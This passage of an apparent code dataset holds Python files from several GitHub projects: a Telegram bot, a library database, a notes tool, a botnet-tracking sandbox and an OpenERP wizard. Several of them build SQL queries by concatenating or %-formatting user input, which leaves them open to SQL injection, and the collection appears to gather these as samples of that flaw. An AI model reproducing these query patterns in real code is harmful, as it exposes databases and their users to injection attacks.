'D', 'text/css' : 'D', 'text/csv' : 'D', 'text/html' : 'D', 'video/3gpp' : 'V', 'video/3gpp2' : 'V', 'video/mpeg' : 'V', 'video/ogg' : 'V', 'video/webm' : 'V', 'video/x-msvideo' : 'V'}\nicon_mime = {'A' : '', 'D' : '', 'P' : '', 'U' : '', 'V' : ' '}\n\n\n@bot.message_handler(commands=['help'])\ndef help(message):\n    bot.send_message(message.from_user.id, \"- Write /start to begin\\n- You can send files, images, videos, etc. and they will be stored in your current path\\n- If you write a message to the bot, it will make a directory with that name in the current path\\n- You can delete files or directories using the red cross next to them\\n- I have tried to make this bot as similar as possible to a basic file explorer\\n- You can donate using /donate\")\n\n@bot.message_handler(commands=['donate'])\ndef help(message):\n    markup = telebot.types.InlineKeyboardMarkup()\n    markup.add(telebot.types.InlineKeyboardButton('PayPal', url='https://www.paypal.me/victor141516'))\n    bot.send_message(message.from_user.id, \"Thank you!\", reply_markup=markup)\n\n@bot.message_handler(commands=['start'])\ndef start(message):\n    telegram_id = message.from_user.id\n\n    bot.send_message(telegram_id, \"- Write /start to begin\\n- You can send files, images, videos, etc. and they will be stored in your current path\\n- If you write a message to the bot, it will make a directory with that name in the current path\\n- I have tried to make this bot as similar as possible to a basic file explorer\\n- You can donate using /donate\")\n    db.insert('user', {'name': message.from_user.username, 'telegram_id': telegram_id}, {'telegram_id' : telegram_id})\n    user_id = db.select('user', \"telegram_id = \" + str(telegram_id))[0]['id']\n\n    db.insert('directory', {'name': '/', 'parent_directory_id': 'NULL', 'user_id': user_id})\n\n    explorers[telegram_id] = Explorer(telegram_id)\n    send_replacing_message(telegram_id, bot)\n\ndef content_builder(content, up=True):\n    markup = telebot.types.InlineKeyboardMarkup()\n    # markup.add(telebot.types.InlineKeyboardButton('New ', callback_data='n')) # Show button for directory creation\n    if (up):\n        markup.add(telebot.types.InlineKeyboardButton(' Go up', callback_data='..'))\n    if (content['directories']):\n        for each in content['directories']:\n            markup.add(\n                    telebot.types.InlineKeyboardButton(\" \" + each['name'], callback_data=\"d\" + str(each['id'])),\n                    telebot.types.InlineKeyboardButton(\"\", callback_data=\"rd\" + str(each['id'])),\n                )\n    if (content['files']):\n        for each in content['files']:\n            if (each['mime'] in icon_mime):\n                icon = icon_mime[each['mime']]\n            else:\n                icon = icon_mime['U']\n            markup.add(\n                    telebot.types.InlineKeyboardButton(icon + \" \" + each['name'], callback_data=\"f\" + str(each['id'])),\n                    telebot.types.InlineKeyboardButton(\"\", callback_data=\"rf\" + str(each['id'])),\n                )\n    return markup\n\n\n@bot.message_handler(content_types=['document', 'audio', 'document', 'photo', 'video', 'video_note', 'voice', 'contact'])\ndef handle_docs(message):\n    telegram_id = message.from_user.id\n\n    if (message.document != None):\n        if (message.document.mime_type in mime_conv):\n            mime = mime_conv[message.document.mime_type]\n        else:\n            mime = 'U'\n        explorers[telegram_id].new_file(message.message_id, message.document.file_name, mime, message.document.file_size)\n    elif (message.audio != None):\n        explorers[telegram_id].new_file(message.message_id, \"audio\" + str(message.date), 'A', message.audio.file_size)\n    elif (message.document != None):\n        explorers[telegram_id].new_file(message.message_id, \"document\" + str(message.date), 'D', message.document.file_size)\n    elif (message.photo != None):\n        explorers[telegram_id].new_file(message.message_id, \"photo\" + str(message.date), 'P', message.photo[0].file_size)\n    elif (message.video != None):\n        explorers[telegram_id].new_file(message.message_id, \"video\" + str(message.date), 'V', message.video.file_size)\n    elif (message.video_note != None):\n        explorers[telegram_id].new_file(message.message_id, \"video_note\" + str(message.date), 'V', message.video_note.file_size)\n    elif (message.voice != None):\n        explorers[telegram_id].new_file(message.message_id, \"voice\" + str(message.date), 'A', message.voice.file_size)\n    elif (message.contact != None):\n        explorers[telegram_id].new_file(message.message_id, \"contact\" + str(message.date), 'D', message.contact.file_size)\n\n\n    bot.reply_to(message, \"\")\n    send_replacing_message(telegram_id, bot)\n\n@bot.message_handler(func=lambda m: True)\ndef new_directory(message):\n    new_directory_name = message.text\n    telegram_id = message.from_user.id\n    explorers[telegram_id].new_directory(new_directory_name)\n    content = explorers[telegram_id].get_directory_content()\n    keyboard = content_builder(content, len(explorers[telegram_id].path) > 1)\n    remove_messages(telegram_id, bot)\n    message_sent = bot.send_message(telegram_id, explorers[telegram_id].get_path_string(), reply_markup=keyboard)\n    explorers[telegram_id].last_action_message_ids.append(message_sent.message_id)\n\n@bot.callback_query_handler(func=lambda call: True)\ndef callback(call):\n    telegram_id = call.from_user.id\n    action = call.data[:1]\n    content_id = call.data[1:]\n\n    if (call.data == \"..\"):\n        explorers[telegram_id].go_to_parent_directory()\n\n    elif (action == \"d\"):\n        explorers[telegram_id].go_to_directory(content_id)\n\n    elif (action == \"f\"):\n        content_id = db.select('file', \"id = \" + content_id)[0]['telegram_id']\n        bot.forward_message(telegram_id, telegram_id, content_id)\n\n    elif (action == \"r\"):\n        is_directory = content_id[:1] == \"d\"\n        content_id = content_id[1:]\n        if (is_directory):\n            explorers[telegram_id].remove_directories([content_id])\n        else:\n            explorers[telegram_id].remove_files([content_id])\n\n    # elif (action == \"n\"):\n    #     markup = telebot.types.ForceReply(selective=False)\n    #     remove_messages(telegram_id, bot)\n    #     message_sent = bot.send_message(telegram_id, \"Send me  name\", reply_markup=markup)\n    #     explorers[telegram_id].last_action_message_ids.append(message_sent.message_id)\n    #     return\n    send_replacing_message(telegram_id, bot)\n\n\ndef remove_messages(telegram_id, bot):\n    result = []\n    if (explorers[telegram_id].last_action_message_ids):\n        for message_id in explorers[telegram_id].last_action_message_ids:\n            result.append(bot.delete_message(telegram_id, message_id))\n            explorers[telegram_id].last_action_message_ids.remove(message_id)\n    return result\n\ndef send_replacing_message(telegram_id, bot):\n    content = explorers[telegram_id].get_directory_content()\n    keyboard = content_builder(content, len(explorers[telegram_id].path) > 1)\n    remove_messages(telegram_id, bot)\n    message_sent = bot.send_message(telegram_id, explorers[telegram_id].get_path_string(), reply_markup=keyboard)\n    explorers[telegram_id].last_action_message_ids.append(message_sent.message_id)\n\nbot.polling()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/dhocker/susannas-library-frb/blob/e7515283715820528a2754065b18b0feee5b09fe",
        "file_path": "/app/models/sql_books.py",
        "source": "#\n# Susanna's New Library\n# Copyright (C) 2016  Dave Hocker (email: AtHomeX10@gmail.com)\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, version 3 of the License.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n# See the LICENSE file for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program (the LICENSE file).  If not, see <http://www.gnu.org/licenses/>.\n#\n\nfrom app.database.connection import get_db, get_cursor\n#import sqlite3\nfrom types import *\n\ndef get_books_by_page(page, pagesize, sort_col, sort_dir):\n    # q = db_session.query(Book).join(Collaborations, Collaborations.book_id==Book.id)\n    # q = q.join(Series, Series.id==Book.series_id)\n    # q = append_order_by_clause(q, sort_col, sort_dir)\n    # count = q.count();\n    # books = q.offset(page * pagesize).limit(pagesize)\n    # dict_books = books_todict(books)\n    # return {\"rows\": dict_books, \"count\": count}\n\n    # Column sorting\n    # TODO There are consistency issues. Collab records with no book or no author.\n    # We use left outer joins here to get all books regardless of collaborations status.\n    stmt = \"\"\"\n        select b.*,\n        case when length(a.FirstName) > 0\n            then (a.LastName || \", \" || a.FirstName)\n            else a.LastName\n            end as Author,\n        s.name as Series from books as b\n        left outer join collaborations as c on c.book_id=b.id\n        left outer join authors as a on a.id=c.author_id\n        left join series as s on s.id=b.series_id\n        order by {0}\n        limit :limit offset :offset\n        \"\"\".format(get_sort_clause(sort_col, sort_dir))\n    inputs = {\"limit\": pagesize, \"offset\": int(page * pagesize)}\n\n    csr = get_cursor()\n    rst = csr.execute(stmt, inputs)\n    rows = rows2list(rst)\n\n    return {\"rows\": rows, \"count\": get_all_books_count()}\n\ndef get_all_books_count():\n    \"\"\"\n    Total count of books\n    :return:\n    \"\"\"\n    stmt = \"\"\"\n        select count(*) from books as b\n        left outer join collaborations as c on c.book_id=b.id\n        left outer join authors as a on a.id=c.author_id\n        left join series as s on s.id=b.series_id\n        \"\"\"\n    csr = get_cursor()\n    count = csr.execute(stmt).fetchone()[0]\n    return count\n\ndef search_for_books_by_page(page, pagesize, author_id, series_id, search_arg, sort_col, sort_dir):\n    # q = db_session.query(Book).join(Collaborations, Collaborations.book_id==Book.id)\n    # q = q.join(Author, Author.id==Collaborations.author_id)\n    # q = q.join(Series, Series.id==Book.series_id)\n    # if author_id:\n    #     # This appears to be slow, but it works for finding an author's books\n    #     # q = q.filter(Book.authors.any(Author.id==author_id))\n    #     # This technique appears to be much faster\n    #     q = q.filter(Book.series_id==series_id)\n    # elif series_id:\n    #     q = q.filter(Book.series_id==series_id)\n    # if search_arg:\n    #     s = \"%\" + search_arg + \"%\"\n    #     q = q.filter(Book.Title.like(s))\n    #\n    # count = q.count()\n    # books = q.order_by(func.lower(Book.Title)).offset(page * page_size).limit(page_size)\n    # dict_books = books_todict(books)\n    #\n    # return {\"rows\": dict_books, \"count\": count}\n\n    # Build where clause based on filter inputs\n    inputs = {\"limit\": pagesize, \"offset\": int(page * pagesize)}\n    wh = \"\"\n    if author_id:\n        wh = \"where c.author_id=\" + str(author_id)\n    elif series_id:\n        wh = \"where b.series_id=\" + str(series_id)\n    if search_arg:\n        # Need Sql injection check on search arg\n        s = \"%\" + search_arg + \"%\"\n        inputs[\"like\"] = s\n        wh = 'where b.Title like :like'\n\n    stmt = \"\"\"\n        select b.*,\n        case when length(a.FirstName) > 0\n            then (a.LastName || \", \" || a.FirstName)\n            else a.LastName\n            end as Author,\n        s.name as Series from books as b\n        left outer join collaborations as c on c.book_id=b.id\n        left outer join authors as a on a.id=c.author_id\n        left join series as s on s.id=b.series_id\n        {1}\n        order by {0}\n        limit :limit offset :offset\n        \"\"\".format(get_sort_clause(sort_col, sort_dir), wh)\n\n    csr = get_cursor()\n    rst = csr.execute(stmt, inputs)\n    rows = rows2list(rst)\n\n    return {\"rows\": rows, \"count\": get_filtered_books_count(author_id, series_id, search_arg)}\n\ndef get_filtered_books_count(author_id, series_id, search_arg):\n    # Build where clause based on filter inputs\n    wh = \"\"\n    parameters = ()\n    if author_id:\n        wh = \"where c.author_id=\" + str(int(author_id))\n    elif series_id:\n        wh = \"where b.series_id=\" + str(int(series_id))\n    if search_arg:\n        # Need to do Sql injection check on search arg\n        s = \"%\" + search_arg + \"%\"\n        parameters += (s.encode('utf-8'),)\n        wh = 'where b.Title like ?'\n\n    stmt = \"\"\"\n        select count(*) from books as b\n        left outer join collaborations as c on c.book_id=b.id\n        left outer join authors as a on a.id=c.author_id\n        left join series as s on s.id=b.series_id\n        {0}\n        \"\"\".format(wh)\n\n    csr = get_cursor()\n    if len(parameters) > 0:\n        count = csr.execute(stmt, parameters).fetchone()[0]\n    else:\n        count = csr.execute(stmt).fetchone()[0]\n    return count\n\n\ndef get_sort_clause(sort_col, sort_dir):\n    # Depends on tables aliased as follows:\n    # b = books\n    # a = authors\n    # s = series\n    column_sort_list = {\n        \"Title\": \"lower(b.Title) {0}\",\n        \"ISBN\": \"b.ISBN {0}\",\n        \"Volume\": \"b.Volume {0}\",\n        \"Series\": \"lower(s.name) {0}\",\n        \"Published\": \"b.Published {0}\",\n        \"Category\": \"lower(b.Category) {0}\",\n        \"Status\": \"lower(b.Status) {0}\",\n        \"CoverType\": \"lower(b.CoverType) {0}\",\n        \"Notes\": \"lower(b.Notes) {0}\",\n        \"id\": \"b.id {0}\",\n        \"Author\": \"lower(a.LastName) {0}, lower(a.FirstName) {0}\"\n    }\n\n    # Sql injection check\n    sd = \"asc\"\n    if sort_dir.lower() == \"desc\":\n        sd = \"desc\"\n\n    return column_sort_list[sort_col].format(sd)\n\ndef rows2list(rows):\n    rlist = []\n    for r in rows:\n        rlist.append(row2dict(r))\n    return rlist\n\ndef row2dict(row):\n    '''\n    Convert a row object to a dict. Used to return JSON to the client.\n    :param row:\n    :return:\n    '''\n    d = {}\n    for column_name in row.keys():\n        v = row[column_name]\n        if type(v) == UnicodeType:\n            d[column_name] = v.encode('utf-8')\n        elif type(v) == IntType:\n            d[column_name] = v\n        else:\n            d[column_name] = str(v)\n\n    return d\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/nitzanel/Expression-graphs/blob/d5cb0f265d7f1d76f2ad5fd1ff911d0053568f76",
        "file_path": "/grapher.py",
        "source": "from loader import Loader\nimport openpyxl as pyxl\nimport os.path\nimport numpy as np\n\nclass Grapher():\n\n\tdef __init__(self):\n\t\tself.loader = Loader()\t\t\n\t\t# dictionary of data sets\n\t\tself.sets = self.loader.getSets()\n\t\t# create a list with all the data sets (that are not blank)\n\t\tself.all_sets = []\n\t\tfor key in self.sets:\n\t\t\tif key != 'blank':\n\t\t\t\tself.all_sets.append(self.sets[key])\n\n\t\tself.graph_width_param = 4\n\t\tself.graph_sub_width_param = 0.5\n\t\tself.marker_size = 40\n\t\tself.folder_name = 'static/images'\n\t\tself.folder_static_name = 'images'\n\n\tdef findFile(self,file_name):\n\t\t#return os.path.isfile(file_name)\n\t\treturn False\n\tdef expectFileName(self,gene_name,data_set,graph_type,file_type = 'png'):\n\t\tfile_name = '_'.join([gene_name,data_set.split('_')[0],graph_type])\n\t\tfile_name = '.'.join([file_name,file_type])\n\t\tfile_dir = '/'.join([self.folder_name,file_name])\n\t\treturn file_dir\n\n\tdef decodeGeneName(self,expected_file):\n\t\tfile_name = expected_file.split('/')[2]\n\t\tgene_name = file_name.split('_')[0]\n\t\tprint gene_name\n\t\treturn gene_name\n\n\tdef decodeDataSet(self,expected_file):\n\t\tfile_name = expected_file.split('/')[2]\n\t\tdata_set = file_name.split('_')[1]\n\t\tprint data_set\n\t\treturn data_set\n\n\n\tdef new_bar_plot(self,gene_name,cell_type,datasets = 'ALL'):\n\t\tdata = self.loader.get_gene(gene_name=gene_name,datasets=datasets,cells=cell_type)\n\t\tif data == {}:\n\t\t\tdata = -1\n\t\treturn data\n\n\tdef new_plot(self,gene_name,cells='ALL'):\n\t\tdata = self.loader.get_gene(gene_name=gene_name,datasets='ALL',cells=cells)\n\t\tif data == {}:\n\t\t\tdata = -1\n\t\treturn data\n\n\tdef bar_plot(self,gene_name,cell_name):\n\t\texp_data = self.loader.loadCellSpecific(gene_name,cell_name)\n\t\treturn exp_data\n\t\"\"\"\n\tcreate scatter plot of the expression\n\tlevel of the gene in all the cells\n\ttypes, and a different plot for each dataset\n\t\"\"\"\n\tdef scatter_plot(self,gene_name):\n\t\tdata_sets = self.all_sets\t\n\t\t# check if the gene exist at all.\n\t\tif self.loader.findRowMatch(gene_name) == -1:\n\t\t\treturn -1\n\t\tsets_dict = self.loader.loadGenes([gene_name],data_sets)\n\t\tsome_data_dict = []\n\t\tcounter = 0\n\t\tfor data_set in sets_dict:\n\t\t\tcounter +=1\n\t\t# add  counnter data sets\t\t\n\t\t\t# create a scatter graph for this set.\n\t\t\tdata = sets_dict[data_set]\n\t\t\thead = data['head'][5:]\n\t\t\tgene_data = data[gene_name][5:]\n\t\t\t# splice the data for male and female.\n\n\t\t\t# create the labels of x axis\n\t\t\txlabels = []\n\t\t\tfor label in head:\n\t\t\t\tcurrent = label.split('_')[0]\n\t\t\t\tif current not in xlabels:\n\t\t\t\t\txlabels.append(current)\n\t\t\t\telse:\n\t\t\t\t\txlabels.append('')\n\n\t\t\tx_index = []\n\t\t\tfor label in xlabels:\n\t\t\t\tif 0 in x_index:\n\t\t\t\t\tif label == '':\n\t\t\t\t\t\tx_index.append(x_index[-1]+self.graph_sub_width_param)\n\t\t\t\t\telse:\n\t\t\t\t\t\tx_index.append(x_index[-1]+self.graph_width_param)\n\t\t\t\telse:\n\t\t\t\t\tx_index.append(0)\n\n\t\t\tfemale_data = gene_data[::2]\n\t\t\tmale_data = gene_data[1::2]\n\t\t\tx_female = []\n\t\t\tx_male = []\n\n\t\t\tcurrent_indexed = []\n\t\t\tsize=0\n\t\t\t# remeber to change the way it arranges data for wierd cells like T4\n\t\t\t# do shenanigans and rearrange some numbers for better apearance\t\t\t\n\t\t\tfor ind, label in enumerate(xlabels):\n\t\t\t\tif label != '':\n\t\t\t\t\tsize = len(current_indexed)\n\t\t\t\t\tif size != 0:\n\t\t\t\t\t\tfor i in current_indexed[:size/2]:\n\t\t\t\t\t\t\tx_female.append(i)\n\t\t\t\t\t\tfor i in current_indexed[size/2:]:\n\t\t\t\t\t\t\tx_male.append(i)\n\t\t\t\t\tcurrent_indexed = []\n\t\t\t\tcurrent_indexed.append(x_index[ind])\n\t\t\tfor i in current_indexed[:size/2]:\n\t\t\t\tx_female.append(i)\n\t\t\tfor i in current_indexed[size/2:]:\n\t\t\t\tx_male.append(i)\n\n\t\t\tgraph_title = ' '.join([gene_name,'expression level',str(counter)])\n\n\t\t\tx_labels = xlabels\n\t\t\tdata_dic = {}\n\t\t\tdata_dic['x_index'] = x_index\n\t\t\tdata_dic['x_labels'] = x_labels\n\t\t\tdata_dic['title'] = graph_title\n\t\t\tdata_dic['x_female'] = x_female\n\t\t\tdata_dic['female_data'] = female_data\n\t\t\tdata_dic['x_male'] = x_male\n\t\t\tdata_dic['male_data'] = male_data\n\t\t\tsome_data_dict.append(data_dic)\n\t\treturn some_data_dict\n\nif __name__ == '__main__':\n\t# just a test to see if it works\n\tgrapher = Grapher()\n\tgrapher.scatter_plot(['FIRRE' ])\n\t#grapher.scatter_plot('FIRRE')\n\n\t#print grapher.loader.loadGenes(['FIRRE'],['Female_Male_exp_levels_norm.xlsx'])\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/mushorg/wsbs/blob/c6639dd185d504d170441fec903922e168764e17",
        "file_path": "/modules/database.py",
        "source": "import sqlite3\n\nclass SandboxBotnet(object):\n    sandbox_id = None\n    file_name = ''\n    file_md5 = ''\n    analysis_date = ''\n    irc_addr = ''\n    irc_server_pwd = ''\n    irc_nick = ''\n    irc_user = ''\n    irc_mode = ''\n    irc_channel = ''\n    irc_nickserv = ''\n    irc_topic = ''\n    irc_notice = []\n    irc_privmsg = []\n    \nclass Botnet(SandboxBotnet):\n    botnet_id = None\n    server_status = None\n    channel_status = None\n    bot_status = None\n\nclass SandboxDB(object):\n    \n    def __init__(self):\n        self.db = sqlite3.connect('db/sandbox.db')\n    \n    def get_credentials(self):\n        botnet_list = []\n        cursor = self.db.cursor()\n        cursor.execute(\"\"\"SELECT * FROM botnets\"\"\")\n        for res in cursor.fetchall():\n            botnet = SandboxBotnet()\n            botnet.sandbox_id, botnet.analysis_date, botnet.file_md5, botnet.file_name = res[0:4]\n            botnet.irc_addr, botnet.irc_server_pwd, botnet.irc_nick = res[4:7]\n            botnet.irc_user, botnet.irc_mode, botnet.irc_channel = res[7:10]\n            botnet.irc_nickserv, botnet.irc_notice, botnet.irc_privmsg = res[10:]\n            botnet_list.append(botnet)\n        return botnet_list\n    \n    def close(self):\n        self.db.close()\n\nclass BotnetInfoDB():\n\n    def __init__(self):\n        self.conn = sqlite3.connect('db/botnet_info.db')\n        self.create()\n\n    def create(self):\n        cursor = self.conn.cursor()\n        try:\n            cursor.execute(\"\"\"CREATE TABLE IF NOT EXISTS botnet_info (id INTEGER PRIMARY KEY, \n            addr TEXT, server_pass TEXT, nick TEXT, user TEXT, mode TEXT, channel TEXT, sandboxid TEXT,\n            lasttime TEXT, topic TEXT, server_status TEXT, channel_status TEXT, bot_status TEXT)\"\"\")\n            self.conn.commit()\n        except sqlite3.OperationalError, e:\n            print \"Creating database Error:\", e\n        except sqlite3.ProgrammingError, e:\n            print \"Creating database Error:\", e\n        finally:\n            cursor.close()\n\n    def insert(self, addr, server_pass, nick, user, mode, channel, sandboxid, time):\n        cursor = self.conn.cursor()\n        try:\n            # If C&C server and port exists, insert into db\n            if addr: \n                cursor.execute(\"INSERT INTO botnet_info VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\", (None, addr, server_pass, nick, user, mode, channel, sandboxid, time, None, None, None, None))\n        except sqlite3.OperationalError, e:\n            print \"Insert into database Error:\", e\n        except sqlite3.ProgrammingError, e:\n            print \"Insert into database Error:\", e\n        finally:\n            self.conn.commit()\n            cursor.close()\n\n    def select_all(self):\n        cursor = self.conn.cursor()\n        botnet_list = []\n        try:\n            data = cursor.execute(\"SELECT * FROM botnet_info\").fetchall()\n            for res in data:\n                botnet = Botnet()\n                botnet.botnet_id = res[0]\n                botnet.irc_addr = res[1]\n                botnet.irc_server_pwd = res[2]\n                botnet.irc_nick = res[3]\n                botnet.irc_user = res[4]\n                botnet.irc_mode = res[5]\n                botnet.irc_channel = res[6]\n                botnet.irc_topic = res[7]\n                botnet.server_status = res[8]\n                botnet.channel_status = res[9]\n                botnet.bot_status = res[10]\n                botnet_list.append(botnet)\n        except sqlite3.OperationalError, e:\n            print \"Select from database Error:\", e\n        except sqlite3.ProgrammingError, e:\n            print \"Select from database Error:\", e\n        finally:\n            cursor.close()\n        return botnet_list\n\n    def select_by_features(self, addr, channel):\n        cursor = self.conn.cursor()\n        data = None\n        try:\n            data = cursor.execute(\"SELECT id FROM botnet_info WHERE addr == ? AND channel == ?\", (addr, channel) ).fetchone()\n        except sqlite3.OperationalError, e:\n            print \"Select from database Error:\", e\n        except sqlite3.ProgrammingError, e:\n            print \"Select from database Error:\", e\n        finally:\n            cursor.close()\n        return data\n\n    def update_time(self, timestamp, botnetID):\n        cursor = self.conn.cursor()\n        try:\n            cursor.execute(\"\"\"UPDATE botnet_info SET lasttime = '%s' WHERE id == '%s'\"\"\" % (timestamp, str(botnetID)))\n            self.conn.commit()\n        except sqlite3.OperationalError, e:\n            print \"Update Time To database Error:\", e\n        except sqlite3.ProgrammingError, e:\n            print \"Update Time To database Error:\", e\n        finally:\n            cursor.close()\n\n    def update_connection(self):\n        pass\n\n    def update_status(self, botnetID, target, status):\n        cursor = self.conn.cursor()\n        try:\n            cursor.execute(\"\"\"UPDATE botnet_info SET %s = '%s' WHERE id == '%s'\"\"\" % (target, status, str(botnetID)))\n        except sqlite3.OperationalError, e:\n            print \"Update %s To database Error:\" % status, e\n        except sqlite3.ProgrammingError, e:\n            print \"Update %s To database Error:\" % status, e\n        finally:\n            self.conn.commit()\n            cursor.close()\n\n    def update_topic(self, line, botnetID):\n        cursor = self.conn.cursor()\n        try:\n            cursor.execute(\"\"\"UPDATE botnet_info SET topic = ? WHERE id == ? \"\"\", (line, str(botnetID)))\n        except sqlite3.OperationalError, e:\n            print \"Update Topic To database Error:\", e\n        except sqlite3.ProgrammingError, e:\n            print \"Update Topic To database Error:\", e\n        finally:\n            self.conn.commit()\n            cursor.close() \n\n    def close_handle(self):\n        self.conn.close()\n\nclass MessageDB():\n\n    def __init__(self, botnetID):\n        self.conn = sqlite3.connect('db/botnets/Botnet_%s.db' % str(botnetID))\n        self.create_table()\n\n    def create_table(self):\n        cursor = self.conn.cursor()\n        try:\n            cursor.execute(\"CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY, timestamp TEXT, rawmsg TEXT)\")\n            self.conn.commit()\n        except sqlite3.OperationalError, e:\n            print \"creating table error\", e\n        except sqlite3.ProgrammingError, e:\n            print \"creating table error\", e\n        finally:\n            cursor.close()\n\n    def insert(self, time, msg):\n        cursor = self.conn.cursor()\n        try:\n            cursor.execute(\"INSERT INTO messages VALUES(?, ?, ?)\", (None, time, msg))\n            self.conn.commit()\n        except sqlite3.OperationalError, e:\n            print \"insert table error\", e\n        except sqlite3.ProgrammingError, e:\n            print \"insert table error\", e\n        finally:\n            cursor.close()\n\n    def show_all(self):\n        cursor = self.conn.cursor()\n        data = None\n        try:\n            data = cursor.execute(\"SELECT * FROM messages\").fetchall()\n        except sqlite3.OperationalError, e:\n            print \"select data from db Error\", e\n        except sqlite3.ProgrammingError, e:\n            print \"select data from db Error\", e\n        finally:\n            cursor.close()\n        return data\n\n    def close_handle(self):\n        self.conn.close()\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/richardsc/nb/blob/734dc290c358f65f767f604a0a36c5cc8e99eb6c",
        "file_path": "/naclass.py",
        "source": "#!/usr/bin/python\nimport sys\nimport sqlite3 as sqlite\nimport datetime\n\nclass na:\n    def __init__(self, filename=\"na.db\", authorId=1, debug=0):\n        con = sqlite.connect(filename)\n        if not con:\n            print \"error opening connection\"\n            sys.exit(1)\n        self.con = con\n        self.cur = con.cursor()\n        self.authorId = authorId\n        self.debug = debug \n\n    def sql(self, cmd, one=False):\n        if self.debug:\n            print cmd\n        self.cur.execute(cmd)\n        if one:\n            return self.cur.fetchone()\n        else:\n            return self.cur.fetchall()\n\n    def add(self, title=\"\", keywords=\"\", content=\"\", privacy=0):\n        now = datetime.datetime.now()\n        date = now.strftime(\"%Y-%m-%d %H:%M:%S\")\n        self.sql(\"INSERT INTO note(authorId, date, title, content, privacy) VALUES(%d, '%s', '%s', '%s', '%s')\" %\n                (self.authorId, date, title, content, privacy))\n        noteId = self.cur.lastrowid\n        for keyword in keywords:\n            keywordId = self.sql(\"SELECT keywordId FROM keyword WHERE keyword='%s';\" % keyword, one=True)\n            if keywordId:\n                keywordId = keywordId[0]\n            else:\n                self.sql(\"INSERT INTO keyword(keyword) VALUES ('%s');\" % keyword)\n                keywordId = self.cur.lastrowid\n                # FIXME: should check whether the insertion worked\n            self.sql(\"INSERT INTO notekeyword(noteId, keywordID) VALUES(%d, %d)\" % (noteId, keywordId))\n        self.con.commit()\n        return(noteId)\n   \n    def find(self, keywords=\"\"):\n        noteIds = []\n        if keywords[0] == \"?\":\n            noteIds = self.sql(\"SELECT noteId from note;\")\n        else:\n            for keyword in keywords:\n                if self.debug:\n                    print \"keyword:\", keyword, \"...\"\n                try:\n                    keywordId = self.sql(\"SELECT keywordId FROM keyword WHERE keyword='%s';\" % keyword)[0]\n                    if keywordId:\n                        keywordId = keywordId[0]\n                        for noteId in self.sql(\"SELECT noteId FROM notekeyword WHERE keywordId=%d;\" % keywordId):\n                            if self.debug:\n                                print '   ', noteId\n                            if noteId not in noteIds:\n                                noteIds.append(noteId)\n                except:\n                    pass\n            if self.debug:\n                print \"noteIds:\", noteIds, \"\\n\"\n        for n in noteIds:\n            res = self.sql(\"SELECT noteId, date, title, content, privacy FROM note WHERE noteId=%s;\" % n, one=True)\n            if int(res[4]) > 0:\n                privacy = \"(Private)\"\n            else:\n                privacy = \"(Public)\"\n            print \"<%s %s> %s %s\\n  %s\" % (res[0], res[1], res[2], privacy, res[3])\n            keys = self.sql(\"SELECT keywordid FROM notekeyword WHERE notekeyword.noteid = %d;\" % n)\n            keywords = []\n            for k in keys:\n                keywords.append(self.sql(\"SELECT keyword FROM keyword WHERE keywordId = %d;\" % k, one=True)[0])\n            print \" \", \", \".join(keywords[i] for i in range(len(keywords))), \"\\n\"\n\n \n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/akretion/openerp-addons-ci/blob/4ad703b1c353a8318094d79ca0dfea34e7f05e27",
        "file_path": "/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = 